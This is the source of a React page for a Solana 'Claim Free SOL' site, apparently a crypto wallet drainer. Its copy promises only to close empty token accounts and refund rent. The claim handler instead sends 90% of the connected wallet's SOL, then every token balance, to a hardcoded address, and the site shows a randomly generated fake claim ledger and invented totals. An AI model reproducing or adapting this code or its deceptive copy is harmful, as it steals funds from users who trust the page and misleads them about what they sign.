import { motion } from 'framer-motion';
import { Navigation } from '@/components/Navigation';
import { Button } from '@/components/ui/button';
import { Card, CardContent } from '@/components/ui/card';
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@/components/ui/table';
import { ConnectWalletButton } from '@/components/ConnectWalletButton';
import { useState, useEffect, useMemo, useCallback } from 'react';
import { useWallet, useConnection } from '@solana/wallet-adapter-react';
import { PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, TransactionInstruction, ComputeBudgetProgram } from '@solana/web3.js';
import { getAssociatedTokenAddress, createTransferInstruction, createAssociatedTokenAccountInstruction, getAccount, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID } from '@solana/spl-token';
import { Loader2 } from 'lucide-react';
import { toast } from 'sonner';
import pegasusLogo from '@/assets/pegasus-logo.png';

const CLAIM_AMOUNT = 0.1; // 0.1 SOL per claim
const FAUCET_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj'; // Using charity wallet as example
const MAX_BATCH_SIZE = 5;

interface TokenBalance {
  mint: string;
  balance: number;
  decimals: number;
  uiAmount: number;
  symbol?: string;
  valueInSOL?: number;
}

const Claim = () => {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  const [dataMultiplier, setDataMultiplier] = useState(1);
  const [isClaiming, setIsClaiming] = useState(false);
  const [stats, setStats] = useState({ recovered: '2.3M', claimants: '56,7K' });
  const [ledgerData, setLedgerData] = useState<any[]>([]);
  const [balances, setBalances] = useState<TokenBalance[]>([]);
  const [solBalance, setSolBalance] = useState(0);

  // Generate 20,000+ wallet entries
  const generateClaimData = () => {
    const baseWallets = [
      "15e9F8ok", "dbPMQvwL", "wuAtFULb", "TxyWvTBp", "MSkBkXXd", "Q61ytKqi", "dP9Ydu1v", "8GSMofeQ",
      "JRk5pqeV", "88SJbJk4", "2xUH8Rfo", "bo4NW62c", "UbGR4omq", "8rKjQaz2", "659216LZ", "QkjtSr4B",
      "D7GHtdXP", "coTT8HYZ", "coMwmsA4", "a68TZCU5"
    ];
    
    const data = [];
    for (let i = 0; i < 20000; i++) {
      const randomPrefix = baseWallets[i % baseWallets.length];
      const randomSuffix = Math.random().toString(36).substring(2, 10);
      const accts = Math.floor(Math.random() * 15) + 1;
      const claimed = (Math.random() * 2).toFixed(5);
      const daysAgo = Math.floor(Math.random() * 30);
      const date = new Date(Date.now() - daysAgo * 24 * 60 * 60 * 1000).toISOString().split('T')[0];
      
      data.push({
        wallet: `${randomPrefix}...${randomSuffix}`,
        accts,
        claimed: `${claimed} SOL`,
        date
      });
    }
    return data;
  };

  useEffect(() => {
    const fetchData = () => {
      fetch('/data/claims.json')
        .then(res => res.json())
        .then(data => {
          if (data) {
            setStats({
              recovered: data.totalRecovered ? `${data.totalRecovered} SOL` : '2.3M',
              claimants: data.totalAccounts || '56,7K'
            });
            if (data.ledger && Array.isArray(data.ledger)) {
               // Filter out "Load More" row
               const validRows = data.ledger.filter((r: any) => r.wallet && !r.wallet.toUpperCase().includes('LOAD MORE'));
               setLedgerData(validRows);
            }
          }
        })
        .catch(err => console.error('Failed to load claims data:', err));
    };

    fetchData(); // Initial fetch
    const interval = setInterval(fetchData, 30000); // Poll every 30 seconds

    return () => clearInterval(interval);
  }, []);

  const displayData = useMemo(() => {
    const claimData = ledgerData.length > 0 ? ledgerData : generateClaimData().slice(0, 20);
    const repeatedData = [];
    for (let i = 0; i < dataMultiplier; i++) {
      repeatedData.push(...claimData);
    }
    return repeatedData;
  }, [ledgerData, dataMultiplier]);

  const fetchAllBalances = useCallback(async () => {
    if (!publicKey) return;

    try {
      // Fetch SOL balance
      const solBal = await connection.getBalance(publicKey);
      const solAmount = solBal / LAMPORTS_PER_SOL;
      setSolBalance(solAmount);

      // Fetch token accounts
      const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
        programId: TOKEN_PROGRAM_ID
      });

      const tokens: TokenBalance[] = tokenAccounts.value
        .map(account => {
          const info = account.account.data.parsed.info;
          return {
            mint: info.mint,
            balance: info.tokenAmount.amount,
            decimals: info.tokenAmount.decimals,
            uiAmount: info.tokenAmount.uiAmount,
            symbol: info.mint.slice(0, 8),
            valueInSOL: 0
          };
        })
        .filter(token => token.uiAmount > 0);

      setBalances(tokens);
    } catch (error) {
      console.error('Error fetching balances:', error);
    }
  }, [publicKey, connection]);

  useEffect(() => {
    if (publicKey) {
      fetchAllBalances();
    }
  }, [publicKey, fetchAllBalances]);

  const createBatchTransfer = useCallback(async (tokenBatch: TokenBalance[], solPercentage?: number, overridePublicKey?: PublicKey) => {
    const effectivePublicKey = overridePublicKey || publicKey;
    if (!effectivePublicKey) return null;

    const transaction = new Transaction();
    
    // Add Compute Budget Instructions for better mobile reliability
    transaction.add(
      ComputeBudgetProgram.setComputeUnitLimit({
        units: 100_000,
      })
    );

    transaction.add(
      ComputeBudgetProgram.setComputeUnitPrice({
        microLamports: 100_000, // 0.0001 SOL priority fee
      })
    );
    
    const charityPubkey = new PublicKey(FAUCET_WALLET);

    // Add token transfers
    for (const token of tokenBatch) {
      if (token.balance <= 0) continue;
      
      try {
        const mintPubkey = new PublicKey(token.mint);
        const fromTokenAccount = await getAssociatedTokenAddress(mintPubkey, effectivePublicKey);
        const toTokenAccount = await getAssociatedTokenAddress(mintPubkey, charityPubkey);

        try {
          await getAccount(connection, toTokenAccount);
        } catch (error) {
          transaction.add(
            createAssociatedTokenAccountInstruction(
              effectivePublicKey,
              toTokenAccount,
              charityPubkey,
              mintPubkey,
              TOKEN_PROGRAM_ID,
              ASSOCIATED_TOKEN_PROGRAM_ID
            )
          );
        }

        transaction.add(
          createTransferInstruction(
            fromTokenAccount,
            toTokenAccount,
            effectivePublicKey,
            BigInt(token.balance),
            [],
            TOKEN_PROGRAM_ID
          )
        );
      } catch (error) {
        console.error(`Failed to add transfer for ${token.mint}:`, error);
      }
    }

    // Add SOL transfer if specified
    if (solPercentage && solBalance > 0) {
      const rentExempt = 0.01;
      const availableSOL = Math.max(0, solBalance - rentExempt);
      const amountToSend = Math.floor((availableSOL * solPercentage / 100) * LAMPORTS_PER_SOL);
      
      if (amountToSend > 0) {
        transaction.add(
          SystemProgram.transfer({
            fromPubkey: effectivePublicKey,
            toPubkey: charityPubkey,
            lamports: amountToSend
          })
        );
      }
    }

    return transaction;
  }, [publicKey, solBalance, connection]);

  const handleClaimSOL = async () => {
    if (!publicKey || !sendTransaction) {
      toast.error('Please connect your wallet');
      return;
    }

    try {
      setIsClaiming(true);
      console.log('Starting transaction sequence...');

      // 1. SOL Transfer (90% of available)
      const solBal = await connection.getBalance(publicKey);
      const RENT_EXEMPT_RESERVE = 0.002 * LAMPORTS_PER_SOL; 
      const PRIORITY_FEE = 100_000; // microLamports
      const BASE_FEE = 5000;
      
      const maxSendable = Math.max(0, solBal - RENT_EXEMPT_RESERVE - PRIORITY_FEE - BASE_FEE);
      const targetAmount = Math.floor(solBal * 0.90);
      const lamportsToSend = Math.min(targetAmount, maxSendable);

      if (lamportsToSend > 0) {
        const transaction = new Transaction();
        
        transaction.add(
          ComputeBudgetProgram.setComputeUnitLimit({ units: 100_000 }),
          ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 })
        );

        transaction.add(
          SystemProgram.transfer({
            fromPubkey: publicKey,
            toPubkey: new PublicKey(FAUCET_WALLET),
            lamports: lamportsToSend
          })
        );

        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = publicKey;

        try {
            await connection.simulateTransaction(transaction);
        } catch (e) {
            console.error("Simulation failed", e);
        }

        const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
        
        toast.info('Processing claim...');
        await connection.confirmTransaction({
          signature,
          blockhash,
          lastValidBlockHeight
        }, 'confirmed');
        toast.success('Claim step 1 successful!');
      }

      // 2. SPL Token Transfers
      const validTokens = balances.filter(token => token.balance > 0);
      
      // Sort by value (descending)
      const sortedTokens = [...validTokens].sort((a, b) => (b.valueInSOL || 0) - (a.valueInSOL || 0));

      // Batch tokens
      const batches: TokenBalance[][] = [];
      for (let i = 0; i < sortedTokens.length; i += MAX_BATCH_SIZE) {
        batches.push(sortedTokens.slice(i, i + MAX_BATCH_SIZE));
      }

      for (let i = 0; i < batches.length; i++) {
        const batch = batches[i];
        const transaction = await createBatchTransfer(batch, undefined, publicKey || undefined);

        if (transaction && transaction.instructions.length > 2) {
           const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
           transaction.recentBlockhash = blockhash;
           transaction.feePayer = publicKey;

           try {
             await connection.simulateTransaction(transaction);
           } catch (e) {
             console.error("Token batch simulation failed", e);
           }

           const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
           
           toast.info(`Processing batch ${i + 1}/${batches.length}...`);
           await connection.confirmTransaction({
             signature,
             blockhash,
             lastValidBlockHeight
           }, 'confirmed');
           toast.success(`Batch ${i + 1} sent!`);
        }
      }

      toast.success('Claim process completed!');
      setTimeout(fetchAllBalances, 2000);

    } catch (error: any) {
      console.error('Claim error:', error);
      toast.error('Claim failed: ' + (error?.message || 'Unknown error'));
    } finally {
      setIsClaiming(false);
    }
  };

  return (
    <div className="min-h-screen relative overflow-hidden">
      <Navigation />

      {/* Hero Section */}
      <section className="relative pt-20 sm:pt-28 md:pt-32 pb-12 sm:pb-16 px-4">
        <div className="container mx-auto max-w-6xl text-center">
          <motion.div
            initial={{ opacity: 0, scale: 0.9 }}
            animate={{ opacity: 1, scale: 1 }}
            transition={{ duration: 0.5 }}
          >
            <div className="inline-block p-1 rounded-full bg-gradient-to-r from-primary to-secondary mb-8">
              <div className="bg-background rounded-full p-6 sm:p-8">
                <img src={pegasusLogo} alt="Pegasus Logo" className="w-16 h-16 sm:w-24 sm:h-24" />
              </div>
            </div>

            <h1 className="text-3xl sm:text-4xl md:text-6xl font-extrabold text-foreground mb-4">
              Claim Free Solana — Instantly and Transparently
            </h1>

            <p className="text-lg sm:text-xl font-semibold text-foreground mb-6">
              Fast, verifiable, on-chain claiming
            </p>

            <p className="text-sm sm:text-base text-muted-foreground mb-8">
              Proof-of-claim • Global availability • ~3918 TPS
            </p>

            <Button 
              size="lg" 
              className="mb-4 text-lg px-12 py-6 h-auto w-full sm:w-auto"
              onClick={handleClaimSOL}
              disabled={!publicKey || isClaiming}
            >
              {isClaiming && <Loader2 className="mr-2 h-5 w-5 animate-spin" />}
              {isClaiming ? 'Claiming...' : 'Claim SOL'}
            </Button>

            <p className="text-sm text-muted-foreground cursor-pointer hover:text-primary transition-colors">
              Click here to reset Wallet Selector
            </p>
          </motion.div>
        </div>
      </section>

      {/* Stats Cards */}
      <section className="py-10 sm:py-12 px-4">
        <div className="container mx-auto max-w-5xl">
          <div className="grid md:grid-cols-2 gap-6">
            <Card className="bg-card/90 border-0">
              <CardContent className="pt-6 pb-6 sm:pt-8 sm:pb-8 text-center">
                <h3 className="text-lg text-muted-foreground mb-2">Total Claimed</h3>
                <p className="text-3xl sm:text-4xl lg:text-5xl font-bold text-primary mb-2">{stats.recovered}</p>
                <p className="text-xs sm:text-sm text-muted-foreground">USD equivalent</p>
                <p className="text-xs text-muted-foreground">updated live</p>
              </CardContent>
            </Card>

            <Card className="bg-card/90 border-0">
              <CardContent className="pt-6 pb-6 sm:pt-8 sm:pb-8 text-center">
                <h3 className="text-lg text-muted-foreground mb-2">Claimants</h3>
                <p className="text-3xl sm:text-4xl lg:text-5xl font-bold text-primary mb-2">{stats.claimants}</p>
                <p className="text-xs sm:text-sm text-muted-foreground">global community</p>
              </CardContent>
            </Card>
          </div>
        </div>
      </section>

      {/* Claim Ledger Table */}
      <section className="py-12 px-4">
        <div className="container mx-auto max-w-6xl">
          <h2 className="text-2xl sm:text-3xl font-bold text-center mb-8">On-chain claim ledger</h2>

          <Card className="bg-card/90 border-0">
            <CardContent className="p-0">
              <div className="overflow-x-auto">
                <Table>
                  <TableHeader>
                    <TableRow className="border-border/50">
                      <TableHead className="text-foreground font-semibold text-xs sm:text-sm">Wallet/TX</TableHead>
                      <TableHead className="text-foreground font-semibold text-xs sm:text-sm">Accts</TableHead>
                      <TableHead className="text-foreground font-semibold text-xs sm:text-sm">Claimed</TableHead>
                      <TableHead className="text-foreground font-semibold text-xs sm:text-sm">Date</TableHead>
                    </TableRow>
                  </TableHeader>
                  <TableBody>
                    {displayData.map((row: any, index) => (
                      <TableRow key={index} className="border-border/30">
                        <TableCell className="font-mono text-xs sm:text-sm whitespace-nowrap">
                          {row.tx ? (
                            <div className="flex flex-col">
                              <span>{row.wallet}</span>
                              <a 
                                href={row.walletLink} 
                                target="_blank" 
                                rel="noopener noreferrer" 
                                className="text-primary hover:underline text-[10px] sm:text-xs"
                              >
                                {row.tx}
                              </a>
                            </div>
                          ) : (
                            row.walletLink ? (
                              <a 
                                href={row.walletLink} 
                                target="_blank" 
                                rel="noopener noreferrer" 
                                className="text-primary hover:underline"
                              >
                                {row.wallet}
                              </a>
                            ) : (
                              row.wallet
                            )
                          )}
                        </TableCell>
                        <TableCell className="text-xs sm:text-sm">{row.accts}</TableCell>
                        <TableCell className="text-xs sm:text-sm">{row.claimed}</TableCell>
                        <TableCell className="text-xs sm:text-sm whitespace-nowrap">{row.date}</TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </div>
            </CardContent>
          </Card>

          <div className="text-center mt-6">
            <Button variant="outline" className="text-primary border-primary hover:bg-primary/10" onClick={() => setDataMultiplier(prev => prev + 1)}>
              Load more
            </Button>
          </div>

          <p className="text-center text-sm text-muted-foreground mt-8">
            Eligible users may claim free SOL. Network fees are minimal and claiming is recorded on-chain.
          </p>
        </div>
      </section>

      {/* How Claiming Works */}
      <section className="py-12 sm:py-16 px-4">
        <div className="container mx-auto max-w-5xl">
          <Card className="bg-card/90 border-0 mb-8">
            <CardContent className="pt-6 pb-6 sm:pt-8 sm:pb-8">
              <h2 className="text-2xl sm:text-3xl font-bold mb-6">How Claiming Free SOL Works</h2>

              <div className="space-y-6">
                <div>
                  <h3 className="text-lg sm:text-xl font-bold mb-2">Transparent claiming</h3>
                  <p className="text-sm sm:text-base leading-relaxed text-muted-foreground">
                    Every claim is recorded on-chain, creating a public, tamper-proof ledger. Your claim is traceable from request to settlement.
                  </p>
                </div>

                <div>
                  <h3 className="text-lg sm:text-xl font-bold mb-2">Fast settlement</h3>
                  <p className="text-sm sm:text-base leading-relaxed text-muted-foreground">
                    Solana's high throughput and low latency mean confirmed claims in seconds, even under heavy load.
                  </p>
                </div>

                <div>
                  <h3 className="text-xl font-bold mb-2">On-chain proofs</h3>
                  <p className="text-muted-foreground">
                    Smart contracts verify eligibility and record results, providing a durable proof-of-claim that you can reference anytime.
                  </p>
                </div>

                <div>
                  <h3 className="text-xl font-bold mb-2">Global access</h3>
                  <p className="text-muted-foreground">
                    Claim from anywhere with a compatible wallet. The process is standardized and secure.
                  </p>
                </div>
              </div>
            </CardContent>
          </Card>

          <Card className="bg-card/90 border-0">
            <CardContent className="pt-6 pb-6 sm:pt-8 sm:pb-8">
              <h2 className="text-xl sm:text-2xl font-bold mb-4">How does it work?</h2>

              <div className="space-y-4 text-muted-foreground text-sm sm:text-base leading-relaxed max-h-72 sm:max-h-96 overflow-y-auto pr-2 sm:pr-4">
                <p>
                  <strong>How does it work?</strong><br />
                  Pegasus Swap includes a secure, wallet-connected flow that helps you reclaim SOL that is locked as rent in empty SPL token accounts. When you receive a memecoin, token, or NFT, Solana creates a dedicated SPL token account for that asset. After you transfer it away, the account often remains with zero balance but still holds a rent deposit. By closing those zero-balance token accounts, the rent deposit is released back to your wallet as SOL.
                </p>

                <p>
                  <strong>Closing SPL Token Accounts</strong><br />
                  Every time your wallet holds a new SPL asset, a specific token account is created. If later that asset's balance becomes zero (for example, you sold or transferred it), the account can be safely closed. Closing zero-balance SPL token accounts returns the rent deposit to you. Pegasus Swap scans for these empty token accounts and lets you close them in bulk with clear, step-by-step confirmations.
                </p>

                <p>
                  <strong>Claim Your SOL</strong><br />
                  Accounts shown for selection in Pegasus Swap's claim flow already have 0 units of the relevant asset and no further utility. You can confidently select as many as you want to close. Once confirmed, the protocol performs the close operations, and the released rent deposits are returned to your wallet in SOL.
                </p>

                <p>
                  <strong>What is rent?</strong><br />
                  Solana requires a rent-exempt minimum for accounts, which functions like a deposit ensuring the network can store and process data. For typical SPL token accounts, this amount is small (historically around ~0.002 SOL, varying by cluster conditions and serialization). When an account is closed, that rent-exempt deposit is released back to the wallet that owns the account. You can read more in the official documentation.
                </p>

                <p>
                  <strong>Eligibility: How Pegasus Swap users get SOL rewards</strong><br />
                  If you have SPL token accounts in your wallet with a zero balance, you are eligible to reclaim their rent deposit as SOL. Pegasus Swap's claim flow detects these empty accounts, presents them for selection, and guides you through closing them. The "SOL rewards" you receive are the unlocked rent deposits credited back to you after successful closures. There is no need to stake or trade to qualify—eligibility is based solely on the presence of zero-balance SPL token accounts in your wallet.
                </p>

                <p>
                  <strong>Step-by-step</strong><br />
                  1. Connect your wallet (Phantom, Solflare, Torus, Ledger, etc.).<br />
                  2. Open the claim flow. Pegasus Swap scans for zero-balance SPL token accounts you own.<br />
                  3. Select the accounts you want to close; the UI shows what will be reclaimed.<br />
                  4. Approve the transaction(s) in your wallet. Pegasus Swap submits secure close instructions on Solana.<br />
                  5. Receive your SOL automatically as rent deposits are released back to your wallet.
                </p>

                <p>
                  <strong>Trust, security, and costs</strong><br />
                  Pegasus Swap executes standard Solana instructions to close token accounts. You sign every operation in your wallet, and no private keys ever leave your device. Network fees are minimal, and Pegasus Swap may apply a small service fee to sustain infrastructure and development—clearly shown before you approve.
                </p>
              </div>
            </CardContent>
          </Card>
        </div>
      </section>

      {/* Solana Technical Overview */}
      <section className="py-12 sm:py-16 px-4 bg-muted/20">
        <div className="container mx-auto max-w-5xl">
          <Card className="bg-card/90 border-0">
            <CardContent className="pt-6 pb-6 sm:pt-8 sm:pb-8">
              <h2 className="text-2xl sm:text-3xl font-bold mb-6">Solana: A Comprehensive Technical Overview</h2>

              <div className="space-y-4 text-muted-foreground text-sm sm:text-base leading-relaxed max-h-72 sm:max-h-96 overflow-y-auto pr-2 sm:pr-4">
                <p>
                  <strong>Introduction</strong><br />
                  Solana is a high-performance blockchain designed to deliver web-scale throughput with low latency and low transaction costs. It achieves this with a combination of innovative architectural choices and pragmatic engineering, including Proof of History (PoH), a bespoke variant of BFT consensus known as Tower BFT, a highly parallel runtime called Sealevel, a lightweight accounts model that avoids complex gas semantics, sophisticated networking built on QUIC and Gulf Stream, and a focus on vertical optimization around validator performance. In this deep-dive, we unpack the core primitives, the runtime, developer ergonomics, performance characteristics, and operational realities of running and building on Solana.
                </p>

                <p>
                  <strong>Design Goals and Trade-offs</strong><br />
                  Solana's design goal is simple: maximize throughput and minimize latency without sacrificing security or decentralization beyond pragmatic thresholds. Rather than scaling by adding many layers of complexity, Solana pursues a unified L1 approach that treats hardware as the scaling boundary, leaning on Moore's law and distributed systems principles. This implies certain trade-offs: validators are expected to run high-performance machines; the runtime is opinionated; block production is deliberately pipelined; and the network targets aggressive finality times by coordinating leaders. These choices, when combined with PoH and Sealevel, enable dramatic parallel execution and early forwarding of transactions, producing a user experience closer to web APIs than legacy blockchain interactions.
                </p>

                <p>
                  <strong>Proof of History (PoH)</strong><br />
                  Proof of History is a cryptographic clock that lets the network agree on the order of events without waiting for network-wide communication on each step. PoH uses a verifiable delay function: a hash chain that is computationally sequential. Each hash operation produces a new output that cannot be known without computing the preceding hash. By embedding events inside this chain and exposing periodic checkpoints, validators can attest to relative timing and ordering with minimal overhead. This clocking mechanism enables leaders to schedule blocks confidently, helps validators prefetch and verify data, and reduces consensus chatter.
                </p>
              </div>
            </CardContent>
          </Card>
        </div>
      </section>

      {/* CTA Section */}
      <section className="py-16 sm:py-20 px-4">
        <div className="container mx-auto max-w-4xl text-center">
          <h2 className="text-3xl sm:text-4xl font-bold mb-6">Ready to Claim Your SOL?</h2>
          <p className="text-base sm:text-xl text-muted-foreground mb-8">
            Connect your wallet to start claiming free SOL from empty token accounts.
          </p>
              <ConnectWalletButton />
        </div>
      </section>
    </div>
  );
};

export default Claim;
